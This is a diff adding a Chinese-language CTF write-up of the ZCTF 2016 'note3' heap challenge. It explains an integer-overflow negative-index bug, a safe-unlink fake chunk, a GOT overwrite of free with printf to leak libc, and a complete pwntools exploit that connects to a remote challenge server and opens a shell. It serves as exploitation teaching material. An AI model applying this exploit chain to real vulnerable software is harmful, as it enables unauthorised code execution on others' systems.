@@ -910,13 +910,271 @@ if __name__ == "__main__":
 
 ```
 
-## 题目
+### 题目
 
 - [DEFCON 2017 Qualifiers beatmeonthedl](https://github.com/Owlz/CTF/raw/master/2017/DEFCON/beatmeonthedl/beatmeonthedl) 
 
-## 参考
+### 参考
 
 - malloc@angelboy
 - https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a
+
+
+## note3
+
+### 介绍
+
+ZCTF 2016的一道题目，考点是safe unlink的利用。
+
+### 题目介绍
+
+题目是一个notepad，提供了创建、删除、编辑、查看笔记的功能
+
+```
+1.New note
+2.Show note
+3.Edit note
+4.Delete note
+5.Quit
+option--->>
+```
+
+保护如下所示
+
+```
+Canary                        : Yes
+NX                            : Yes
+PIE                           : No
+Fortify                       : No
+RelRO                         : Partial
+```
+
+### 功能概述
+
+程序New功能用来新建笔记，笔记的大小可以自定只要小于1024字节。
+
+```
+int new()
+{
+  puts("Input the length of the note content:(less than 1024)");
+  size = get_num();
+  if ( size < 0 )
+    return puts("Length error");
+  if ( size > 1024 )
+    return puts("Content is too long");
+  heap_ptr = malloc(size);
+  puts("Input the note content:");
+  my_read(heap_ptr, size, '\n');
+  bss_ptr[i] = heap_ptr;
+  current_ptr[i + 8LL] = size;
+  current_ptr[0] = bss_ptr[i];
+  return printf("note add success, the id is %d\n", i);
+}
+```
+
+所有的笔记malloc出来的指针存放在bss上全局数组bss_ptr中，这个数组最多可以存放7个heap_ptr。
+而且heap_ptr对应的size也被放在bss_ptr数组中。current_ptr表示当前笔记，bss布局如下。
+
+```
+.bss:
+current_ptr
+note0_ptr
+note1_ptr
+note2_ptr
+note3_ptr
+note4_ptr
+note5_ptr
+note6_ptr
+note7_ptr
+note0_size
+note1_size
+note2_size
+note3_size
+note4_size
+note5_size
+note6_size
+note7_size
+```
+
+Show功能是无用的功能，edit和delete可以编辑和释放note。
+
+### 漏洞
+
+漏洞存在于edit功能中，这里面在获取用户输入的id号之后并没有进行验证。如果输入的id是负数的话依然可以执行。
+在get_num函数中存在整数溢出漏洞，我们可以获得一个负数。
+
+```
+int edit()
+{
+ 
+  id = get_num();
+  data_ptr = ptr[id];
+  if ( data_ptr )
+  {
+    puts("Input the new content:");
+    my_read(ptr[id], current_ptr[id + 8], '\n');
+    current_ptr[0] = ptr[id];
+    data_ptr = puts("Edit success");
+  }
+}
+```
+
+因此我们可以使得edit读入cuurent_ptr，使用的size是note7_ptr
+```
+.bss:
+current_ptr <== edit ptr
+note0_ptr
+note1_ptr
+note2_ptr
+note3_ptr
+note4_ptr
+note5_ptr
+note6_ptr
+note7_ptr   <== size
+note0_size
+note1_size
+note2_size
+note3_size
+note4_size
+note5_size
+note6_size
+note7_size
+```
+首先创建8个note，然后edit note3使current_ptr指向note3，之后使用-1溢出note3
+```
+new(512,'a')
+new(512,'a')
+new(512,'a')
+new(512,'a')
+new(512,'a')
+new(512,'a')
+new(512,'a')
+new(512,'a')
+
+edit(3,'a')
+edit(-9223372036854775808,data);
+```   
+
+我们使用的溢出数据是用于构造一个fake chunk来实现safe unlink的利用，具体的原理可以看这一章节的讲解。
+
+```
+data = ''
+data += p64(0) + p64(512+1) #fake chunk header
+data += p64(0x6020e0-0x18) + p64(0x6020e0-0x10) #fake fd and bk 
+data += 'A'*(512-32) 
+data += p64(512) + p64(512+16) 
+```
+
+之后释放note4，note3与note4就会合并。note3_ptr会指向note0_ptr的位置。这样我们通过不断的修改note0_ptr的值和edit note0就可以实现任意地址写数据。
+
+但是题目没有提供show功能，所以无法进行任意地址读，也就无法泄漏数据。
+这里采用的办法是把free的got表改为printf的值，然后在bbs中一块空白的区域写入"%x"。
+这样当free这块区域（这块区域在ptr_array中，所以可以直接传递给free），就可以泄漏出栈中的数据。
+通过栈中的libc地址求出system的地址就可以利用任意地址写获得shell
+
+```
+free(4)
+   
+edit(3,free_got)
+edit(0,printf_plt)
+  
+edit(3,p64(0x6020e8))
+edit(0,'%llx.'*30)
+```
+完成的exp如下
+
+```
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+from pwn import *
+import time
+def malloc(size,data):
+    print conn.recvuntil('>>')
+    conn.sendline('1')
+    print conn.recvuntil('1024)')
+    conn.sendline(str(size))
+    print conn.recvuntil('content:')
+    conn.sendline(data)
+    print conn.recvuntil('\n')
+def edit(id,data):
+    print conn.recvuntil('>>')
+    conn.sendline('3')
+    print conn.recvuntil('note:')
+    conn.sendline(str(id))
+    print conn.recvuntil('ent:')
+    conn.sendline(data)
+    print conn.recvuntil('success')
+def free(id):
+    print conn.recvuntil('>>')
+    conn.sendline('4')
+    print conn.recvuntil('note:')
+    conn.sendline(str(id))
+    print conn.recvuntil('success')
+    
+#conn = remote('127.0.0.1',9999)
+conn = remote('115.28.27.103',9003)
+free_got = p64(0x602018)
+puts_got = p64(0x602020)
+stack_got = p64(0x602038)
+printf_got = p64(0x602030)
+exit_got = p64(0x602078)
+printf_plt = p64(0x400750)
+puts_plt = p64(0x400730)
+#libcstartmain_ret_off = 0x21b45
+#sys_off = 0x414f0
+libcstartmain_ret_off = 0x21ec5
+sys_off = 0x46640
+# 1. int overflow lead to double free
+intoverflow = -9223372036854775808
+malloc(512,'/bin/sh\0')
+malloc(512,'/bin/sh\0')
+malloc(512,'/bin/sh\0')
+malloc(512,'/bin/sh\0')
+malloc(512,'/bin/sh\0')
+malloc(512,'/bin/sh\0')
+malloc(512,p64(0x400ef8))
+malloc(512,'/bin/sh\0')
+# 2. make a fake chunk and modify the next chunk's pre size 
+fakechunk = p64(0) + p64(512+1) + p64(0x6020e0-0x18) + p64(0x6020e0-0x10) + 'A'*(512-32) + p64(512) + p64(512+16)
+edit(3,'aaaaaa')
+edit(intoverflow,fakechunk)
+# 3. double free
+free(4)
+# 4. overwrite got
+edit(3,free_got)
+edit(0,printf_plt+printf_plt)
+# 5. leak the stack data
+edit(3,p64(0x6020e8))
+edit(0,'%llx.'*30)
+#free->puts
+print conn.recvuntil('>>')
+conn.sendline('4')
+print conn.recvuntil('note:')
+conn.sendline(str(0))
+#time.sleep(0.3)
+ret =  conn.recvuntil('success')
+print ret
+# 6. calcuate the system's addr
+libcstart = ret.split('.')[10]
+libcstart_2 = int(libcstart,16) - libcstartmain_ret_off
+print 'libc start addr:',hex(libcstart_2)
+system_addr = libcstart_2 + sys_off
+print 'system_addr:',hex(system_addr)
+# 7. overwrite free's got
+edit(3,free_got)
+edit(0,p64(system_addr)+printf_plt)
+# 8. write argv
+edit(3,p64(0x6020d0))
+edit(0,'/bin/sh\0')
+# 9. exploit
+print conn.recvuntil('>>')
+conn.sendline('4')
+print conn.recvuntil('note:')
+conn.sendline(str(0))
+sleep(0.2)
+conn.interactive()
+```
+
+
 
 
